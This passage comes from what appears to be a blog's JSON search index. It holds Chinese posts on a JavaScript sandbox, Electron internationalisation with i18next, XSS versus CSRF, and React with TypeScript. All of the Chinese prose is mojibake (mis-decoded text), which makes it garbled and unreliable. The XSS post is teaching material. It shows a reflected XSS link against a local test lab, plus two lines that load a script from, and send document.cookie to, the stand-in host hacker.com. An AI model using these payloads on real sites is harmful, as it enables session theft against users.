$self: &quot;xxxx&quot;,&#125;;const ExpRE = /^\\s*\\&#123;\\&#123;([\\s\\S]*)\\&#125;\\&#125;\\s*$/;const withedCode = (code: string) =&gt; &#123; return new Function(&quot;$root&quot;, `with($root) &#123; return ($&#123;code&#125;); &#125;`);&#125;;// å¯è®¿é—®å…¨å±€ä½œç”¨åŸŸçš„ç™½åå•åˆ—è¡¨const access_white_list = [&quot;Math&quot;, &quot;Date&quot;];const Sandbox = (source: string, scope = &#123;&#125;) =&gt; &#123; const matched = source.match(ExpRE); if (!matched) return source; const code = matched[1]; // æ‰§è¡Œä¸Šä¸‹æ–‡å¯¹è±¡çš„ä»£ç†å¯¹è±¡ const scopeProxy = new Proxy(scope, &#123; has: (target, prop) =&gt; &#123; // has å¯ä»¥æ‹¦æˆª with ä»£ç å—ä¸­ä»»æ„å±æ€§çš„è®¿é—® if (access_white_list.includes(prop)) &#123; // åœ¨å¯è®¿é—®çš„ç™½åå•å†…ï¼Œå¯ç»§ç»­å‘ä¸ŠæŸ¥æ‰¾ return target.hasOwnProperty(prop); &#125; if (!target.hasOwnProperty(prop)) &#123; throw new Error(`Invalid expression - $&#123;prop&#125;! You can not do that!`); &#125; return true; &#125;, &#125;); withedCode(code).call(scopeProxy, scopeProxy);&#125;;"},{"title":"Electron - ä½¿ç”¨ i18next & react-i18next è¿›è¡Œå›½é™…åŒ–","path":"/2023/01/29/yuque/Electron - ä½¿ç”¨ i18next & react-i18next è¿›è¡Œå›½é™…åŒ–/","content":"i18next æ˜¯ç¤¾åŒºä¸­ä¼˜ç§€çš„å›½é™…åŒ–æ¡†æ¶ï¼Œåœ¨ react ä¸­å¹¿æ³›ä½¿ç”¨ï¼Œæˆ‘å¸çš„å¤§é‡äº§å“éƒ½ä½¿ç”¨ i18next è¿›è¡Œå›½é™…åŒ–ï¼Œè€Œ react-i18next æ˜¯ i18next çš„ä¸€ä¸ªæ‰©å±•ï¼Œæä¾›äº†ä¸€äº› HOC åŠ hook æ–¹ä¾¿æˆ‘ä»¬åœ¨ react ä¸­ä½¿ç”¨ i18nextã€‚ ç”±äº electron æ˜¯å¤šè¿›ç¨‹æœºåˆ¶ï¼Œä¸»è¿›ç¨‹å’Œæ¸²æŸ“è¿›ç¨‹éƒ½éœ€è¦ä¸ª i18next å®ä¾‹ï¼Œä½†æ˜¯å¤šå®ä¾‹å¸¦æ¥äº†ä¸€äº›é—®é¢˜ï¼Œæ¯”å¦‚å¤šå®ä¾‹çš„è¯­è¨€å¦‚ä½•åŒæ­¥ï¼Œæ–‡æ¡ˆå¦‚ä½•é›†ä¸­ç®¡ç†ï¼Ÿ é’ˆå¯¹ä¸Šé¢çš„ä¸¤ä¸ªé—®é¢˜ï¼Œç»è¿‡å®è·µï¼Œæˆ‘ç»™å‡ºçš„è§£å†³æ–¹æ¡ˆå¦‚ä¸‹ï¼š ä¸»è¿›ç¨‹è´Ÿè´£åŠ è½½ç”¨æˆ·é€‰æ‹©çš„è¯­è¨€å’Œå¯¹åº”çš„æ–‡æ¡ˆ æ¸²æŸ“è¿›ç¨‹é€šè¿‡è¿›ç¨‹é€šä¿¡ä»ä¸»è¿›ç¨‹çš„å®ä¾‹ä¸Šè·å–åˆå§‹åŒ–è¯­è¨€å’Œæ–‡æ¡ˆåˆå§‹åŒ–å®ä¾‹ ç”¨æˆ·åœ¨æ¸²æŸ“è¿›ç¨‹åˆ‡æ¢è¯­è¨€ï¼Œé€šè¿‡è¿›ç¨‹é€šä¿¡ï¼Œä¸»è¿›ç¨‹çš„ i18next å®ä¾‹åŠ è½½æ–°è¯­è¨€çš„æ–‡æ¡ˆï¼Œå¹¶è¿”å›ç»™æ¸²æŸ“è¿›ç¨‹åŠ¨æ€åŠ è½½åˆ°æ¸²æŸ“è¿›ç¨‹çš„å®ä¾‹ä¸­ æ•´ä¸ªæµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š ä¸»è¿›ç¨‹ç”¨æˆ·é€‰æ‹©çš„ç³»ç»Ÿè¯­è¨€ä¿å­˜åœ¨ electron-store ä¸­ï¼Œé€šè¿‡ getConfigStoreæ–¹æ³•è·å–ä¸Šæ¬¡ç”¨æˆ·é€‰æ‹©çš„ç³»ç»Ÿè¯­è¨€ï¼Œé»˜è®¤ä¸ºä¸­æ–‡ 123456789101112131415import Store from &quot;electron-store&quot;;export interface StoreState &#123; theme: string; config: NOTES.Config;&#125;export const getConfigStore = &lt;K extends keyof NOTES.Config&gt;(key: K) =&gt; &#123; return getStore&lt;NOTES.Config[K]&gt;(`config.$&#123;key&#125;`);&#125;;export const setConfigStore = (value: Partial&lt;NOTES.Config&gt;) =&gt; &#123; const config = getAllConfigStore(); return setStore(&quot;config&quot;, &#123; ...config, ...value &#125;);&#125;; i18next-fs-backend æ˜¯ i18next çš„ä¸€ä¸ªæ‰©å±•ï¼Œå…è®¸ Node.js ä»æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­åŠ è½½ç¿»è¯‘ 1234567891011121314151617import i18next from &quot;i18next&quot;;import i18nextBackend from &quot;i18next-fs-backend&quot;;import &#123; getConfigStore &#125; from &quot;./store&quot;;i18next.use(i18nextBackend).init(&#123; lng: getConfigStore(&quot;lang&quot;) || &quot;zh-CN&quot;, fallbackLng: &quot;en-US&quot;, backend: &#123; loadPath: path.join(__dirname, &quot;./i18n/&#123;&#123;lng&#125;&#125;.json&quot;), &#125;, interpolation: &#123; escapeValue: false, // react already safes from xss &#125;,&#125;);export default i18next; i18next å®ä¾‹åˆå§‹åŒ–åï¼Œé€šè¿‡ loadLanguagesåŠ è½½å¯¹åº”è¯­è¨€çš„æ–‡æ¡ˆï¼ŒgetResourceBundleè·å–è¯­è¨€çš„æ–‡æ¡ˆï¼Œé€šè¿‡è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œæ¸²æŸ“è¿›ç¨‹å°±å¯ä»¥å…±äº«ä¸»è¿›ç¨‹çš„æ–‡æ¡ˆï¼Œå®ç°æ–‡æ¡ˆçš„é›†ä¸­ç®¡ç†ã€‚ 12345678910111213141516171819202122232425262728293031import logger from &quot;electron-log&quot;;import i18next, &#123; LngOptions &#125; from &quot;../../utils/i18n&quot;;export const getI18nLanguages = () =&gt; &#123; return LngOptions;&#125;;export const getI18nInitResource = async () =&gt; &#123; const lng = i18next.language; const resource = await getI18nResource(lng); return &#123; lng, resource &#125;;&#125;;export const getI18nResource = async (lng: string) =&gt; &#123; await i18next.loadLanguages(lng).catch((err) =&gt; &#123; logger.error(err); &#125;); return i18next.getResourceBundle(lng, &quot;&quot;);&#125;;export const changeI18nLang = async (lng: string) =&gt; &#123; return new Promise&lt;boolean&gt;((resolve) =&gt; &#123; i18next.changeLanguage(lng, (err) =&gt; &#123; if (err) logger.error(err); resolve(!err); &#125;); &#125;);&#125;; æ¸²æŸ“è¿›ç¨‹invokeCommandåŒå­¦ window ä¸ŠæŒ‚è½½çš„å˜é‡å’Œä¸»è¿›ç¨‹åŒå‘é€šè¡Œ 123456export const invokeCommand = &lt;T&gt;(type: string, payload = &#123;&#125;) =&gt; &#123; return window.api.invoke&lt;T&gt;(&quot;fromRenderer&quot;, &#123; type, payload, &#125;);&#125;; æ¸²æŸ“è¿›ç¨‹é€šè¿‡ invokeCommand è°ƒç”¨ä¸»è¿›ç¨‹çš„ getI18nInitResource æ–¹æ³•è·å–åˆå§‹çš„è¯­è¨€å’Œæ–‡æ¡ˆå®Œæˆå®ä¾‹çš„åˆå§‹åŒ–ã€‚ç”¨æˆ·åˆ‡æ¢è¯­è¨€æ—¶ï¼ŒåŒæ ·é€šè¿‡è¿›ç¨‹é€šä¿¡è·å–æ–°è¯­è¨€çš„æ–‡æ¡ˆï¼Œé€šè¿‡ i18next.addResourceBundleåŠ¨æ€åŠ è½½åˆ°å®ä¾‹ä¸­ï¼Œè°ƒç”¨ i18next.changeLanguageå®Œæˆè¯­è¨€çš„åˆ‡æ¢ã€‚ 1234567891011121314151617181920212223242526272829303132333435import i18next, &#123; ResourceKey &#125; from &quot;i18next&quot;;import &#123; initReactI18next &#125; from &quot;react-i18next&quot;;import &#123; invokeCommand &#125; from &quot;@/commands&quot;;export const initI18next = async () =&gt; &#123; const &#123; lng, resource &#125; = await invokeCommand&lt;&#123; lng: string; resource: ResourceKey; &#125;&gt;(&quot;getI18nInitResource&quot;); return i18next.use(initReactI18next).init(&#123; lng, resources: &#123; [lng]: &#123; translation: resource, &#125;, &#125;, interpolation: &#123; escapeValue: false, &#125;, &#125;);&#125;;export const changeLanguage = async (lng: string) =&gt; &#123; if (!i18next.hasResourceBundle(lng, &quot;translation&quot;)) &#123; // åŠ¨æ€åŠ è½½è¯­è¨€ const resource = await invokeCommand&lt;ResourceKey&gt;(&quot;getI18nResource&quot;, lng); i18next.addResourceBundle(lng, &quot;translation&quot;, resource); &#125; return i18next.changeLanguage(lng);&#125;;export default i18next; æ€»ç»“ï¼šelectron çš„å¤šè¿›ç¨‹æœºåˆ¶å¯¼è‡´ i18next ä¸å¾—ä¸åˆå§‹åŒ–å‡ºå¤šä¸ªå®ä¾‹ï¼Œä½†æ˜¯æˆ‘ä»¬åŒæ ·å¯ä»¥åˆ©ç”¨è¿›ç¨‹é€šä¿¡ï¼Œè®©ä¸€ä¸ªå®ä¾‹åŠ è½½æ–‡æ¡ˆï¼Œå†åŒæ­¥åˆ°å¦ä¸€ä¸ªå®ä¾‹ï¼Œå®ç°æ–‡æ¡ˆçš„é›†ä¸­ç®¡ç†ã€‚"},{"title":"XSSå’ŒCSRFçš„åŒºåˆ«åŠé˜²å¾¡","path":"/2022/03/08/XSSå’ŒCSRFçš„åŒºåˆ«åŠé˜²å¾¡/","content":"åœ¨ Web å®‰å…¨é¢†åŸŸï¼ŒXSS å’Œ CSRF æ˜¯ä¸ªè€ç”Ÿå¸¸è°ˆçš„éƒ½è¡Œäº†ï¼Œç‰¹åˆ«æ˜¯é¢è¯•çš„æ—¶å€™ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰å¾ˆå¤šåŒå­¦å°†å®ƒä»¬ææ··ã€‚æœ¬æ–‡å°†ç®€å•çš„ä»‹ç»ä¸‹å®ƒä»¬çš„åŒºåˆ«ï¼Œä»¥åŠå¸¸è§çš„é˜²å¾¡æ‰‹æ®µã€‚ ä»‹ç»ä¹‹å‰ï¼Œå…ˆä¸Šä¸‹ç»´åŸºç™¾ç§‘ï¼š XSSï¼šè·¨ç«™è„šæœ¬ï¼ˆCross-site scriptingï¼Œé€šå¸¸ç®€ç§°ä¸ºXSSï¼‰æ˜¯ä¸€ç§ç½‘ç«™åº”ç”¨ç¨‹åºçš„å®‰å…¨æ¼æ´æ”»å‡»ï¼Œæ˜¯ä»£ç æ³¨å…¥çš„ä¸€ç§ã€‚å®ƒå…è®¸æ¶æ„ç”¨æˆ·å°†ä»£ç æ³¨å…¥åˆ°ç½‘é¡µä¸Šï¼Œå…¶ä»–ç”¨æˆ·åœ¨è§‚çœ‹ç½‘é¡µæ—¶å°±ä¼šå—åˆ°å½±å“ã€‚è¿™ç±»æ”»å‡»é€šå¸¸åŒ…å«äº†HTMLä»¥åŠç”¨æˆ·ç«¯è„šæœ¬è¯­è¨€ã€‚ CSRF:è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆè‹±è¯­ï¼šCross-site request forgeryï¼‰ï¼Œä¹Ÿè¢«ç§°ä¸º one-click attack æˆ–è€… session ridingï¼Œé€šå¸¸ç¼©å†™ä¸º CSRF æˆ–è€… XSRFï¼Œ æ˜¯ä¸€ç§æŒŸåˆ¶ç”¨æˆ·åœ¨å½“å‰å·²ç™»å½•çš„Webåº”ç”¨ç¨‹åºä¸Šæ‰§è¡Œéæœ¬æ„çš„æ“ä½œçš„æ”»å‡»æ–¹æ³•ã€‚ XSSç”¨â€œäººè¯è¯´â€ï¼ŒXSS å°±æ˜¯æ¶æ„æ”»å‡»è€…å¾€ Web é¡µé¢é‡Œæ’å…¥æ¶æ„ Script ä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­ Web é‡Œé¢çš„ Script ä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚ XSSæ”»å‡»å¯ä»¥åˆ†ä¸º3ç±»ï¼šåå°„å‹ï¼ˆéæŒä¹…å‹ï¼‰ã€å­˜å‚¨å‹ï¼ˆæŒä¹…å‹ï¼‰ã€åŸºäºDOMã€‚ åå°„å‹åå°„å‹æ˜¯æŒ‡xssä»£ç åœ¨è¯·æ±‚çš„urlä¸­ï¼Œè€Œåæäº¤åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨è§£æåï¼ŒXSSä»£ç éšç€å“åº”å†…å®¹ä¸€èµ·ä¼ ç»™å®¢æˆ·ç«¯è¿›è¡Œè§£ææ‰§è¡Œã€‚ï¼ˆç›´æ¥åå°„æ˜¾ç¤ºåœ¨é¡µé¢ï¼‰ æµç¨‹å›¾å¦‚ä¸‹ï¼š é€šè¿‡æµç¨‹å›¾å¯ä»¥å¾ˆå®¹æ˜“çŸ¥é“å­˜å‚¨å‹XSSçš„å¸¸ç”¨æ”»å‡»æµç¨‹ä¸ºï¼šæ”»å‡»è€…æ„é€ å¸¦æœ‰æ¶æ„XSSä»£ç çš„URLâ€”&gt;åˆ«çš„ç”¨æˆ·è®¿é—®è¿™ä¸ªURLâ€”&gt;æ¶æ„ä»£ç è¢«æœåŠ¡å™¨è§£æâ€”&gt;ä¼ é€’ç»™å‰ç«¯æ¸²æŸ“å®ç°æ”»å‡»ã€‚ å¦‚æœä½ æƒ³ææ‡‚ä¸€ä¸ªæ¼æ´ï¼Œæ¯”è¾ƒå¥½çš„æ–¹æ³•æ˜¯ï¼šä½ å¯ä»¥è‡ªå·±å…ˆåˆ¶é€ å‡ºè¿™ä¸ªæ¼æ´ï¼ˆç”¨ä»£ç ç¼–å†™ï¼‰ï¼Œç„¶åå†åˆ©ç”¨å®ƒï¼Œæœ€åå†ä¿®å¤å®ƒ pikachuï¼Œæ˜¯ä¸ªå¼€æºçš„æ¼æ´æµ‹è¯•å¹³å°ï¼ŒæŒ‰ç…§ README å¯åŠ¨é¡¹ç›®åï¼Œè·³è½¬åˆ°ã€Œåå°„å‹xssã€é¡µé¢ï¼Œåœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥ã€Œkobeã€åï¼Œç‚¹å‡» submitï¼Œæ‰“å¼€æ§åˆ¶å°ï¼Œè§‚å¯Ÿåç«¯è¿”å›çš„ htmlï¼š å¯ä»¥çœ‹åˆ°ï¼Œè¾“å…¥æ¡†çš„å†…å®¹å‡ºç°åœ¨ html å’Œé“¾æ¥é‡Œï¼Œè¿™å°±ç»™æˆ‘ä»¬å¸¦æ¥äº†å¯ä¹˜ä¹‹æœºï¼Œå¦‚æœè¾“å…¥æ¡†é‡Œè¾“å…¥çš„æ˜¯ä¸€æ®µ script è„šæœ¬å‘¢ï¼Ÿ è„šæœ¬è¢«æ’å…¥åˆ° htmlhä¸­ï¼Œå¹¶ä¸”è¢«æ‰§è¡Œã€‚è¿™æ—¶å°†è¿™æ®µé“¾æ¥ http://localhost:8095/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&amp;submit=submit# å‘é€ç»™ç”¨æˆ·ï¼Œè¯±å¯¼ç”¨æˆ·ç‚¹å‡»ï¼Œå°±å®Œæˆäº†ä¸€æ¬¡ XSS æ”»å‡»ã€‚ ç°åœ¨çš„è„šæœ¬åªæ˜¯ alert ç”¨æˆ·çš„ cookieï¼Œè¿˜åœç•™åœ¨æ¶æçš„å±‚é¢ï¼Œå¦‚æœå°† cookie å‘é€åˆ°æ¶æ„æ”»å‡»è€…çš„æœåŠ¡å™¨ä¸Šï¼Œé‚£å°±æ˜¯ä¸€èµ·ä¸¥é‡çš„å®‰å…¨äº‹æ•…äº†ã€‚ 1&lt;script src=\"http://hacker.com/hacker.js\"&gt;&lt;/script&gt; 123var img = new Image();img.src = \"http://hacker.com/hack.png?q=\" + document.cookie;document.body.append(img); å­˜å‚¨å‹å­˜å‚¨å‹ XSS ä¼šæŠŠç”¨æˆ·è¾“å…¥çš„æ•°æ® â€œå­˜å‚¨â€ åœ¨æœåŠ¡å™¨ç«¯ï¼Œå½“æµè§ˆå™¨è¯·æ±‚æ•°æ®æ—¶ï¼Œè„šæœ¬ä»æœåŠ¡å™¨ä¸Šä¼ å›å¹¶æ‰§è¡Œã€‚è¿™ç§ XSS æ”»å‡»å…·æœ‰å¾ˆå¼ºçš„ç¨³å®šæ€§ã€‚ åå°„å‹ XSS æ¯æ¬¡æ”»å‡»è¿˜éœ€è¦è¯±å¯¼ç”¨æˆ·ç‚¹å‡»è¯±é¥µé“¾æ¥ï¼Œå¦‚æœç”¨æˆ·æ— åŠ¨äºè¡·ï¼Œæ”»å‡»è€…ä¹Ÿæ˜¯æ— å¯å¥ˆä½•ï¼Œè€Œå­˜å‚¨å‹ XSS ä¸€æ—¦å°†æ¶æ„è„šæœ¬å…¥åº“äº†ï¼Œä»»ä½•è®¿é—®åˆ°è¿™æ®µè„šæœ¬ç”¨æˆ·éƒ½ä¼šä¸­æ‹›ã€‚ æ¯”è¾ƒå¸¸è§çš„ä¸€ä¸ªåœºæ™¯æ˜¯æ”»å‡»è€…åœ¨ç¤¾åŒºæˆ–è®ºå›ä¸Šå†™ä¸‹ä¸€ç¯‡åŒ…å«æ¶æ„ JavaScript ä»£ç çš„æ–‡ç« æˆ–è¯„è®ºï¼Œæ–‡ç« æˆ–è¯„è®ºå‘è¡¨åï¼Œæ‰€æœ‰è®¿é—®è¯¥æ–‡ç« æˆ–è¯„è®ºçš„ç”¨æˆ·ï¼Œéƒ½ä¼šåœ¨ä»–ä»¬çš„æµè§ˆå™¨ä¸­æ‰§è¡Œè¿™æ®µæ¶æ„çš„ JavaScript ä»£ç ã€‚ æµç¨‹å›¾å¦‚ä¸‹ï¼š é€šè¿‡æµç¨‹å›¾å¯ä»¥å¾ˆå®¹æ˜“çŸ¥é“å­˜å‚¨å‹XSSçš„å¸¸ç”¨æ”»å‡»æµç¨‹ä¸ºï¼šæ”»å‡»è€…å‰ç«¯æ’å…¥æ¶æ„XSSä»£ç â€”&gt;åç«¯ä¸åšå¤„ç†ä¼ å…¥æ•°æ®åº“â€”&gt;åˆ«çš„ç”¨æˆ·è®¿é—®é¡µé¢â€”&gt;åç«¯ä»æ•°æ®åº“ä¸­è°ƒç”¨XSSä»£ç â€”&gt;å‰ç«¯æ¸²æŸ“(æ‰§è¡Œjsè„šæœ¬)æ¶æ„ä»£ç å®ç°æ”»å‡»ã€‚ è¿™é‡Œè¿˜æ˜¯ç”¨ pikachu æ¥å®æ“ä¸‹ï¼Œæ‰“å¼€ã€Œå­˜å‚¨å‹xssã€é¡µé¢ï¼Œè¾“å…¥æ¡†ä¸­è¾“å…¥ä¸€æ®µ script è„šæœ¬ï¼š æäº¤åå¹¶åˆ·æ–°é¡µé¢ï¼Œè¿™æ®µè„šæœ¬è¢«æ³¨å…¥åˆ° html ä¸­ï¼Œå¹¶æ‰§è¡Œäº†"},{"title":"åœ¨ React é¡¹ç›®ä¸­ä¼˜é›…åœ°ä½¿ç”¨ Typescript","path":"/2021/04/19/åœ¨Reacté¡¹ç›®ä¸­ä¼˜é›…åœ°ä½¿ç”¨Typescript/","content":"TypeScript æ˜¯ Javascript çš„è¶…é›†ï¼Œæ‰©å±•äº† JavaScript çš„è¯­æ³•ï¼Œç»™ JavaScript å¸¦æ¥äº†é™æ€ç±»å‹æ”¯æŒï¼Œäº†è§£å¦‚ä½•åœ¨ React é¡¹ç›®ä¸­ä¼˜é›…åœ°ä½¿ç”¨ Typescriptï¼Œèƒ½å¸®åŠ©æˆ‘ä»¬å†™å‡ºæ›´ä¼˜é›…çš„ä»£ç ã€‚ ã€Œä¼˜é›…ã€çš„å«ä¹‰ï¼š å‡å°‘ç¼–å†™å†—ä½™çš„ç±»å‹å®šä¹‰ã€ç±»å‹æ ‡æ³¨ï¼Œå……åˆ†åˆ©ç”¨tsçš„è‡ªåŠ¨ç±»å‹æ¨æ–­ï¼Œä»¥åŠå¤–éƒ¨æä¾›çš„ç±»å‹å£°æ˜ã€‚ ç±»å‹å®‰å…¨ï¼šæä¾›è¶³å¤Ÿçš„ç±»å‹ä¿¡æ¯æ¥é¿å…è¿è¡Œæ—¶é”™è¯¯ï¼Œè®©é”™è¯¯æš´éœ²åœ¨å¼€å‘æœŸã€‚è¿™äº›ç±»å‹ä¿¡æ¯åŒæ—¶èƒ½å¤Ÿæä¾›ä»£ç è¡¥å…¨ã€è·³è½¬åˆ°å®šä¹‰ç­‰åŠŸèƒ½ã€‚ ç»„ä»¶å®šä¹‰å‡½æ•°ç»„ä»¶1234567891011121314151617import * as React from 'react';// å¦‚æœåœ¨tsconfigä¸­è®¾ç½®äº†\"allowSyntheticDefaultImports\": true// ä½ è¿˜å¯ä»¥æ›´ç²¾ç»ƒåœ°import reactï¼š// import React from \"react\";interface IProps { // CSSPropertiesæä¾›æ ·å¼å£°æ˜çš„ç±»å‹ä¿¡æ¯ // ç”¨æˆ·ä¼ å…¥styleçš„æ—¶å€™å°±èƒ½å¤Ÿè·å¾—ç±»å‹æ£€æŸ¥å’Œä»£ç è¡¥å…¨ style?: React.CSSProperties; // ä½¿ç”¨@types/reactæä¾›çš„äº‹ä»¶ç±»å‹å®šä¹‰ï¼Œè¿™é‡ŒæŒ‡å®ševent.targetçš„ç±»å‹æ˜¯HTMLButtonElement onClick(event: React.MouseEvent&lt;HTMLButtonElement&gt;): void; // ...}const MyComponent: React.FC&lt;IProps&gt; = (props) =&gt; { const { children, ...restProps } = props; return &lt;div {...restProps}&gt;{children}&lt;/div&gt;;} FCæ˜¯FunctionComponentçš„ç¼©å†™ã€‚ IPropsæ— éœ€å£°æ˜childrenå±æ€§çš„ç±»å‹ã€‚React.FCä¼šè‡ªåŠ¨ä¸ºpropsæ·»åŠ è¿™ä¸ªå±æ€§ç±»å‹ã€‚å½“ç„¶ï¼Œå¦‚æœchildrenæœŸæœ›ä¸€ä¸ªrender propï¼Œæˆ–è€…æœŸæœ›å…¶ä»–ç‰¹æ®Šçš„å€¼ï¼Œé‚£ä¹ˆä½ è¿˜æ˜¯è¦è‡ªå·±ç»™childrenå£°æ˜ç±»å‹ï¼Œè€Œä¸æ˜¯ä½¿ç”¨é»˜è®¤çš„React.ReactNodeã€‚ propsæ— éœ€åšç±»å‹æ ‡æ³¨ã€‚ å‡½æ•°ç»„ä»¶defaultPropsï¼ˆDeprecateï¼‰å¦‚æœä½ éœ€è¦å®šä¹‰defaultPropsï¼Œé‚£ä¹ˆä¸è¦ä½¿ç”¨React.FCï¼Œå› ä¸ºReact.FCå¯¹defaultPropsçš„æ”¯æŒä¸æ˜¯å¾ˆå¥½ï¼š 1234567const defaultProps = { who: \"Johny Five\"};type IProps = { age: number } &amp; typeof defaultProps;export const Greet = (props: IProps) =&gt; { return &lt;div&gt;123&lt;/div&gt; };Greet.defaultProps = defaultProps; äº‹å®ä¸Šï¼Œä¸€ä¸ªæè®®åœ¨å‡½æ•°ç»„ä»¶ä¸­åºŸå¼ƒdefaultPropsçš„React rfcå·²ç»è¢«æ¥å—ï¼Œæ‰€ä»¥ä»¥åè¿˜æ˜¯å°½é‡å‡å°‘åœ¨å‡½æ•°ç»„ä»¶ä¸Šä½¿ç”¨defaultPropsï¼Œä½¿ç”¨ES6åŸç”Ÿçš„å‚æ•°è§£æ„+é»˜è®¤å‚æ•°ç‰¹æ€§å°±å·²ç»èƒ½å¤Ÿæ»¡è¶³éœ€è¦ï¼š 1const TestFunction: FunctionComponent&lt;Props&gt; = ({ foo = \"bar\" }) =&gt; &lt;div&gt;{foo}&lt;/div&gt; ç±»ç»„ä»¶12345678910111213141516171819interface IProps { message: string;}interface IState { count: number;}export class MyComponent extends React.Component&lt;IProps, IState&gt; { state: IState = { // duplicate IState annotation for better type inference count: 0 }; render() { return ( &lt;div&gt; {this.props.message} {this.state.count} &lt;/div&gt; ); }} å¦‚æœä½ é€šè¿‡å£°æ˜stateå±æ€§æ¥åˆå§‹åŒ–stateï¼Œé‚£ä¹ˆä½ éœ€è¦ä¸ºè¿™ä¸ªå±æ€§å¢åŠ IStateç±»å‹æ ‡æ³¨ã€‚è™½ç„¶è¿™ä¸å‰é¢çš„React.Component&lt;IProps, IState&gt;æœ‰é‡å¤çš„å«Œç–‘ï¼Œä½†æ˜¯è¿™ä¸¤è€…å®é™…ä¸Šæ˜¯ä¸åŒçš„ï¼š React.Component&lt;IProps, IState&gt;åªæ˜¯æ ‡æ³¨äº†åŸºç±»çš„stateå±æ€§ç±»å‹ã€‚ è€Œå½“ä½ åœ¨å­ç±»å£°æ˜stateæ—¶ï¼Œä½ å¯ä»¥ä¸ºstateæ ‡æ³¨ä¸€ä¸ªã€IStateçš„å­ç±»å‹ã€‘ä½œä¸ºoverrideã€‚è¿™æ ·ï¼Œthis.stateä¼šä»¥å­ç±»ä¸­çš„stateå±æ€§å£°æ˜ä½œä¸ºç±»å‹ä¿¡æ¯çš„æ¥æºã€‚ å»ºè®®ä½¿ç”¨å‡½æ•°ç»„ä»¶ã€‚ å¯æ¸²æŸ“èŠ‚ç‚¹ç±»å‹å¯æ¸²æŸ“èŠ‚ç‚¹å°±æ˜¯ï¼šå¯ä»¥ç›´æ¥è¢«ç»„ä»¶æ¸²æŸ“å‡½æ•°è¿”å›çš„å€¼ã€‚ ä¸å¯æ¸²æŸ“èŠ‚ç‚¹æœ‰å…³çš„ç±»å‹å®šä¹‰å¦‚ä¸‹ï¼ˆæ‘˜å½•è‡ª[@types/react](https://github.com/DefinitelyTyped/DefinitelyTyped/blob/8a1b68be3a64e5d2aa1070f68cc935d668a976ad/types/react/index.d.ts#L187ï¼‰ï¼š 12345type ReactText = string | number;type ReactChild = ReactElement | ReactText;interface ReactNodeArray extends Array&lt;ReactNode&gt; {}type ReactFragment = {} | ReactNodeArray;type ReactNode = ReactChild | ReactFragment | ReactPortal | boolean | null | undefined; ç»„ä»¶ç±»å‹ React.FC&lt;Props&gt;ï¼ˆå³ React.FunctionComponent&lt;Props&gt;ï¼‰ React.Component&lt;Props, State&gt; React.ComponentType&lt;Props&gt;ï¼ˆå³ComponentClass&lt;P&gt; | FunctionComponent&lt;P&gt;ï¼‰ åœ¨å†™HOCçš„æ—¶å€™ç»å¸¸ç”¨åˆ°ã€‚ 123const withState = &lt;P extends WrappedComponentProps&gt;( WrappedComponent: React.ComponentType&lt;P&gt;,) =&gt; { ... è·å–å¹¶æ‰©å±•åŸç”Ÿå…ƒç´ çš„propsç±»å‹æ¯”å¦‚ï¼Œä»¥ä¸‹ä¾‹å­è·å–å¹¶æ‰©å±•äº†&lt;button&gt;çš„propsç±»å‹ï¼š 123export const PrimaryButton = ( props: Props &amp; React.HTMLProps&lt;HTMLButtonElement&gt;) =&gt; &lt;Button size={ButtonSizes.default} {...props} /&gt;; PrimaryButtonèƒ½å¤Ÿæ¥å—æ‰€æœ‰åŸç”Ÿ&lt;button&gt;æ‰€æ¥å—çš„propsã€‚å…³é”®åœ¨äºReact.HTMLPropsã€‚ è·å–å¹¶æ‰©å±•ç¬¬ä¸‰æ–¹ç»„ä»¶çš„propsç±»å‹123456import { Button } from \"library\"; // but doesn't export ButtonProps! oh no!type ButtonProps = React.ComponentProps&lt;typeof Button&gt;; // no problem! grab your own!type AlertButtonProps = Omit&lt;ButtonProps, \"onClick\"&gt;; // modifyconst AlertButton: React.FC&lt;AlertButtonProps&gt; = props =&gt; ( &lt;Button onClick={() =&gt; alert(\"hello\")} {...props} /&gt;); äº‹ä»¶ç±»å‹@types/reactæä¾›äº†å„ç§äº‹ä»¶çš„ç±»å‹ï¼Œæ¯”å¦‚ä»¥ä¸‹æ˜¯ä½¿ç”¨React.FormEventçš„ä¾‹å­ï¼š 1234567891011121314151617181920class App extends React.Component&lt; {}, { text: string }&gt; { state = { text: '', } onChange = (e: React.FormEvent&lt;HTMLInputElement&gt;): void =&gt; { this.setState({ text: e.currentTarget.value }) } render() { return ( &lt;div&gt; &lt;input type=\"text\" value={this.state.text} onChange={this.onChange} /&gt; &lt;/div&gt; ) }} åœ¨Reactä¸­ï¼Œæ‰€æœ‰äº‹ä»¶ï¼ˆåŒ…æ‹¬FormEventã€KeyboardEventã€MouseEventç­‰ï¼‰éƒ½æ˜¯SyntheticEventçš„å­ç±»å‹ã€‚ä»–ä»¬åœ¨@types/reactä¸­å®šä¹‰å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031// DOMäº‹ä»¶çš„åŸºæœ¬å±æ€§éƒ½å®šä¹‰åœ¨è¿™é‡Œinterface BaseSyntheticEvent&lt;E = object, C = any, T = any&gt; { nativeEvent: E; currentTarget: C; target: T; bubbles: boolean; cancelable: boolean; defaultPrevented: boolean; eventPhase: number; isTrusted: boolean; preventDefault(): void; isDefaultPrevented(): boolean; stopPropagation(): void; isPropagationStopped(): boolean; persist(): void; timeStamp: number; type: string;}interface SyntheticEvent&lt;T = Element, E = Event&gt; extends BaseSyntheticEvent&lt;E, EventTarget &amp; T, EventTarget&gt; {}// å…·ä½“çš„äº‹ä»¶ç±»å‹ï¼šinterface FormEvent&lt;T = Element&gt; extends SyntheticEvent&lt;T&gt; {}interface KeyboardEvent&lt;T = Element&gt; extends SyntheticEvent&lt;T, NativeKeyboardEvent&gt; { altKey: boolean; // ...}interface MouseEvent&lt;T = Element, E = NativeMouseEvent&gt; extends SyntheticEvent&lt;T, E&gt; { altKey: boolean; // ...}// 